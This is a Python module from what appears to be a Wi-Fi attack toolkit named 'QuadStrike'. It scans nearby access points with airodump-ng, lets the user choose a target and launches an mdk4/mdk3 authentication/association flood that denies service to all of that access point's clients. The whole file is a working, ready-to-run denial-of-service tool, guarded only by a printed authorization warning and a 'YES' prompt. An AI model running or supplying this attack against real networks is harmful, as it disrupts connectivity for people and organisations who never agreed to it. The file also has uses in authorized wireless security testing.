#!/usr/bin/env python3
"""
QuadStrike - DoS Attack Module (Authentication/Association Flood)
Performs Authentication/Association Flood Attack using mdk4/mdk3
"""

import subprocess
import csv
import os
import time
from color import *
from utils import list_all_interfaces, check_for_essid

def dos_attack():
    """DoS attack module - Authentication/Association Flood Attack"""
    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{ORANGE}{BOLD}{'💥  AUTHENTICATION/ASSOCIATION FLOOD ATTACK  💥':^92}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    print(f"\n{GOLD}[{CYAN}i{GOLD}] This attack floods the target AP with authentication/association frames{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Overwhelms the AP and denies service to legitimate clients{RESET}")
    
    # Check if mdk4 or mdk3 is installed
    print(f"\n{GOLD}[{GREEN}+{GOLD}] Checking for required tools...{RESET}")
    
    mdk4_check = subprocess.run(["which", "mdk4"], capture_output=True, text=True)
    mdk3_check = subprocess.run(["which", "mdk3"], capture_output=True, text=True)
    
    if mdk4_check.returncode == 0:
        mdk_tool = "mdk4"
        print(f"{GOLD}[{GREEN}✓{GOLD}] Found mdk4{RESET}")
    elif mdk3_check.returncode == 0:
        mdk_tool = "mdk3"
        print(f"{GOLD}[{GREEN}✓{GOLD}] Found mdk3{RESET}")
    else:
        print(f"\n{RED}[✗] Neither mdk4 nor mdk3 is installed on this system.{RESET}")
        print(f"\n{GOLD}[{CYAN}i{GOLD}] To install mdk4:{RESET}")
        print(f"{GOLD}    Ubuntu/Debian: {ORANGE}sudo apt-get install mdk4{RESET}")
        print(f"{GOLD}    Kali Linux: {ORANGE}sudo apt-get install mdk4{RESET}")
        print(f"\n{GOLD}[{CYAN}i{GOLD}] Or install mdk3:{RESET}")
        print(f"{GOLD}    {ORANGE}sudo apt-get install mdk3{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return
    
    # Get all interfaces
    all_ifaces = list_all_interfaces()
    if len(all_ifaces) == 0:
        print(f"\n{RED}[✗] No network interfaces detected. Please connect an adapter and try again.{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    print(f"\n{GOLD}[{GREEN}+{GOLD}] Detected network interfaces:{RESET}")
    print(f"{GOLD}{'─' * 85}{RESET}")
    for idx, iface in enumerate(all_ifaces):
        wflag = f"{GREEN}Wireless{RESET}" if iface["is_wireless"] else f"{CYAN}Wired{RESET}"
        mac_display = iface["mac"] if iface["mac"] else "unknown"
        print(f"{GOLD}    [{BRIGHT_GOLD}{idx}{GOLD}] ➤ {ORANGE}{iface['name']:12}{GOLD}  {wflag:16}  MAC: {CYAN}{mac_display}{RESET}")
    print(f"{GOLD}{'─' * 85}{RESET}")

    # Let user pick an interface
    while True:
        sel = input(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Select interface index (must be wireless): {ORANGE}")
        print(RESET, end='')
        try:
            sel_i = int(sel)
            if sel_i < 0 or sel_i >= len(all_ifaces):
                raise ValueError
            chosen = all_ifaces[sel_i]
            break
        except Exception:
            print(f"{RED}[✗] Please enter a valid number from the list above.{RESET}")

    # Ensure the chosen interface is wireless
    if not chosen["is_wireless"]:
        print(f"\n{RED}[✗] Interface {chosen['name']} is not wireless. Wireless adapter required.{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    hacknic = chosen["name"]
    print(f"\n{GOLD}[{GREEN}✓{GOLD}] Using wireless interface: {ORANGE}{hacknic}{RESET}")
    
    print(f"{GOLD}[{GREEN}+{GOLD}] Killing conflicting processes...{RESET}")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"{GOLD}[{GREEN}+{GOLD}] Putting WiFi adapter into monitor mode...{RESET}")
    subprocess.run(["sudo", "airmon-ng", "start", hacknic])
    
    # Wait for interface to be ready
    time.sleep(2)

    # Start airodump-ng
    monitor_iface = hacknic + "mon"
    
    print(f"{GOLD}[{GREEN}+{GOLD}] Starting network scan on {ORANGE}{monitor_iface}{RESET}...{RESET}")
    
    discover_access_points = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", monitor_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    # Give airodump-ng time to start
    time.sleep(3)

    # Scanning loop
    active_wireless_networks = []
    try:
        while True:
            subprocess.call("clear", shell=True)
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print(f"{GOLD}[{GREEN}+{GOLD}] Scanning networks... Press {RED}Ctrl+C{GOLD} to select target.{RESET}\n")
            print(f"{GOLD}No  │ BSSID              │ Channel │ ESSID{RESET}")
            print(f"{GOLD}────┼────────────────────┼─────────┼──────────────────────────────{RESET}")
            for index, item in enumerate(active_wireless_networks):
                print(f"{ORANGE}{index:2}{GOLD}  │ {CYAN}{item['BSSID']}{GOLD} │ {BRIGHT_GOLD}{item['channel'].strip():^7}{GOLD} │ {ORANGE}{item['ESSID']}{RESET}")
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n\n{GOLD}[{GREEN}✓{GOLD}] Ready to select target.{RESET}")

    # Stop scanning
    discover_access_points.kill()

    # Select target
    while True:
        choice = input(f"\n{GOLD}[{BRIGHT_GOLD}?{GOLD}] Select target number: {ORANGE}")
        print(RESET, end='')
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print(f"{RED}[✗] Please try again.{RESET}")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
    hackessid = active_wireless_networks[int(choice)]["ESSID"]

    print(f"\n{GOLD}[{GREEN}+{GOLD}] Target: {ORANGE}{hackessid}{GOLD} ({CYAN}{hackbssid}{GOLD}) on channel {BRIGHT_GOLD}{hackchannel}{RESET}")
    
    # Set channel for monitor interface
    subprocess.run(["sudo", "airmon-ng", "start", monitor_iface, hackchannel])
    time.sleep(1)

    # Display warning and attack info
    print(f"\n{RED}╔{'═' * 83}╗{RESET}")
    print(f"{RED}║{BOLD}{'⚠️  WARNING  ⚠️':^91}{RESET}{RED}║{RESET}")
    print(f"{RED}╠{'═' * 83}╣{RESET}")
    print(f"{RED}║  This will launch an Authentication/Association Flood Attack on the target AP.    ║{RESET}")
    print(f"{RED}║  The AP will be overwhelmed with fake authentication/association requests.        ║{RESET}")
    print(f"{RED}║  This will deny service to all legitimate clients.                               ║{RESET}")
    print(f"{RED}║  Use ONLY on networks you own or have authorization to test.                     ║{RESET}")
    print(f"{RED}╚{'═' * 83}╝{RESET}")
    
    # Display attack information
    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{CYAN}{BOLD}{'ATTACK INFORMATION':^83}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╠{'═' * 83}╣{RESET}")
    print(f"{GOLD}║  {ORANGE}Tool:{GOLD} {mdk_tool:<75} ║{RESET}")
    print(f"{GOLD}║  {ORANGE}Attack Type:{GOLD} Authentication/Association Flood (Mode 'a')                      ║{RESET}")
    print(f"{GOLD}║  {ORANGE}Method:{GOLD} Sends massive fake auth/assoc frames with spoofed MAC addresses      ║{RESET}")
    print(f"{GOLD}║  {ORANGE}Effect:{GOLD} Overwhelms AP processing, denies service to legitimate clients       ║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    confirm = input(f"\n{GOLD}[{RED}?{GOLD}] Type 'YES' to confirm and launch attack: {ORANGE}")
    print(RESET, end='')
    
    if confirm.upper() != "YES":
        print(f"\n{ORANGE}[!] Attack cancelled.{RESET}")
        input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
        return

    # Launch Authentication/Association Flood Attack in a new terminal window
    print(f"\n{GOLD}[{RED}⚡{GOLD}] Launching Authentication/Association Flood Attack...{RESET}")
    
    # mdk4/mdk3 command: mode 'a' = authentication/association flood
    if mdk_tool == "mdk4":
        attack_cmd = ["sudo", "mdk4", monitor_iface, "a", "-a", hackbssid, "-m"]
    else:  # mdk3
        attack_cmd = ["sudo", "mdk3", monitor_iface, "a", "-a", hackbssid, "-m"]
    
    flood_terminals = [
        ["gnome-terminal", "--"] + attack_cmd,
        ["xterm", "-e"] + [" ".join(attack_cmd)],
        ["konsole", "-e"] + [" ".join(attack_cmd)],
        ["xfce4-terminal", "-e"] + [" ".join(attack_cmd)],
    ]
    
    flood_process = None
    for term_cmd in flood_terminals:
        try:
            flood_process = subprocess.Popen(term_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{GOLD}[{GREEN}✓{GOLD}] Opened attack window using {term_cmd[0]}{RESET}")
            break
        except FileNotFoundError:
            continue
    
    if flood_process is None:
        print(f"{ORANGE}[!] No terminal emulator found. Running attack in background...{RESET}")
        flood_process = subprocess.Popen(attack_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{RED}{BOLD}{'AUTHENTICATION/ASSOCIATION FLOOD ATTACK ACTIVE':^83}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╠{'═' * 83}╣{RESET}")
    print(f"{GOLD}║  {ORANGE}Target:{GOLD} {hackessid:<72} ║{RESET}")
    print(f"{GOLD}║  {ORANGE}BSSID:{GOLD} {hackbssid:<73} ║{RESET}")
    print(f"{GOLD}║  {ORANGE}Channel:{GOLD} {hackchannel:<71} ║{RESET}")
    print(f"{GOLD}║  {ORANGE}Attack:{GOLD} {RED}Flooding with fake authentication/association frames{GOLD}{' ' * 19}║{RESET}")
    print(f"{GOLD}║  {ORANGE}Status:{GOLD} {RED}AP is being overwhelmed with spoofed requests{GOLD}{' ' * 28}║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    print(f"\n{GOLD}[{CYAN}i{GOLD}] The attack window is running continuously{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] The AP is being flooded with fake authentication/association frames{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] All clients will be unable to connect to the AP{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Press Enter to stop the attack{RESET}")
    
    input(f"\n{GOLD}Press Enter to stop Authentication/Association Flood Attack...{RESET}")

    # Kill the process
    print(f"\n{GOLD}[{GREEN}+{GOLD}] Stopping attack...{RESET}")
    
    try:
        flood_process.terminate()
        time.sleep(1)
        flood_process.kill()
    except:
        pass
    
    # Kill any remaining processes
    try:
        subprocess.run(["sudo", "pkill", "-9", "mdk4"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-9", "mdk3"], stderr=subprocess.DEVNULL)
    except:
        pass
    
    # Display success message
    print(f"\n{GOLD}╔{'═' * 83}╗{RESET}")
    print(f"{GOLD}║{GREEN}{BOLD}{'DoS ATTACK COMPLETED':^83}{RESET}{GOLD}║{RESET}")
    print(f"{GOLD}╚{'═' * 83}╝{RESET}")
    
    print(f"\n{GREEN}[✓] Attack executed successfully!{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Target: {CYAN}{hackbssid}{GOLD} on channel {BRIGHT_GOLD}{hackchannel}{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] Authentication/Association flood packets were sent{RESET}")
    print(f"{GOLD}[{CYAN}i{GOLD}] The access point should have been temporarily overwhelmed{RESET}")
    
    print(f"{GOLD}[{GREEN}✓{GOLD}] Authentication/Association Flood Attack stopped.{RESET}")
    input(f"\n{GOLD}Press Enter to return to main menu...{RESET}")
